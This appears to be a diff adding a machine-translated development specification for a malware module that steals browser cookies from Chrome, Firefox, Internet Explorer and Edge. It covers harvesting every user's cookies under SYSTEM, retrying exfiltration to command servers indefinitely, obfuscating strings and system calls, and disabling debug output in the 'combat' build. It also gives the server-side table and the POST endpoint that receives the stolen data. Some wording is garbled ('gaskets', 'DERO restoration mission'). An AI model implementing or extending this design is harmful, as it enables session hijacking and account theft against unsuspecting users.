@@ -1,0 +1,102 @@
+TERMS OF REFERENCE FOR THE DEVELOPMENT OF THE COOKIES COLLECTION MODULE FOR BROWSERS
+
+GOALS AND REQUIREMENTS
+
+The module must collect cookies from major browsers (Chrome, Firefox, Internet Explorer, Microsoft Edge) and send them via DPOST to the server.
+Module requirements:
+- designed in accordance with the rules for the development of modules
+- the only module config is a list of DPOST pads
+- works both on behalf of the user and on behalf of SYSTEM
+
+IMPLEMENTATION DETAILS
+
+1. Only cookies that do not have an expiration date or have not yet expired are collected.
+2. If the module is running under SYSTEM, it iterates over all non-system users and collects cookies for each of them.
+   If the module is running as a regular user, it collects cookies only for him.
+3. Upon completion of work, the module must give the WantRelease event (see "module_HOWTO") for unloading from memory
+4. The collected cookies are sent until a positive response is received from the pad.
+   If there is no connection with the gaskets, the module falls asleep for half an hour, after which it tries again. To infinity.
+5. The module sends the following events:
+- "Version build %DATE% %TIME%" (once at startup)
+- "Cookies grabbed from <browser name> for user <username>" on successful collection
+- "No cookies from <browser name> for user <username>" if this browser does not have cookies
+- "Cookies sent to server" on successful sending to DPOST server
+- "Cookies send failure: servers unavailable" when no DPOST servers are available
+6. In this module, you can use C++ STL (std::string, containers) to a limited extent.
+   It is forbidden to use std::mutex and synchronization primitives - for this you can only use
+   WinAPI synchronization primitives (CRITICAL_SECTION, etc.).
+7. Obfuscate the strings with the Andrivet library (attached, see _STR() macro)
+8. Obfuscate system calls with the GetApi.h library. Be careful, obfuscation of syscalls can cause crashes.
+9. The module must have two versions - x32- and x64-bit.
+10. In the combat assembly, lines should be obfuscated to the maximum, all debugging output should be disabled.
+11. The module must have a debug version. Debugging output should be output to c:/temp/cookies.log (the path to the log is configured in the macro).
+12. The project must have a settings file config.h (the name is not important, the essence is important - here are all the global settings - paths, conditional compilation switch macros, etc.).
+13. The module should work on all modern versions of Windows.
+    The minimum supported version of Windows is Windows XP (if not possible, Windows Vista).
+
+
+DPOST PROTOCOL
+
+See the document "TK grabbing DPOST passwords".
+Regarding this document, the sending format has been changed:
+
+username|browser|domain|cookie_name|cookie_value|created|expires|path\r\n
+
+where
+
+username - username
+browser - browser code (enum = chrome|ff|ie|edge)
+domain - cookie domain
+cookie_name - cookie name
+cookie_value - cookie value
+created - date-time of creation, Unix time
+expires - date-time of expiration, Unix time
+path - the URI path
+
+
+DPOST CONFIG
+
+See the document "TK grabbing DPOST passwords".
+This config module parses when it receives a Control("dpost",...) call
+
+
+DERO RESTORATION MISSION
+
+1. Create a new command to get cookie data. For example, command code 84
+
+2. Create a table to store data (SQL pseudocode):
+CREATE TABLE cookies (
+  id SERIAL,
+  username VARCHAR(255),
+  browser VARCHAR(255)
+  domain VARCHAR(255)
+  cookie_name VARCHAR(255)
+  cookie_value VARCHAR(255)
+  created DATETIME,
+  expires DATETIME,
+  path VARCHAR(255)
+);
+
+3. Ensure that data is received in the following format:
+- plain text divided into lines.
+Line separator - can be either UNIX or DOS.
+One line - one entry.
+Record field separator - vertical bar |
+Recording format:
+
+username|browser|domain|cookie_name|cookie_value|created|expires|path\r\n
+
+where
+
+username - username
+browser - browser code (enum = chrome|ff|ie|edge)
+domain - cookie domain
+cookie_name - cookie name
+cookie_value - cookie value
+created - date-time of creation, Unix time
+expires - date-time of expiration, Unix time
+path - the URI path
+
+- receive on URI /group/id/84
+by HTTP POST
+Getting data in the data field
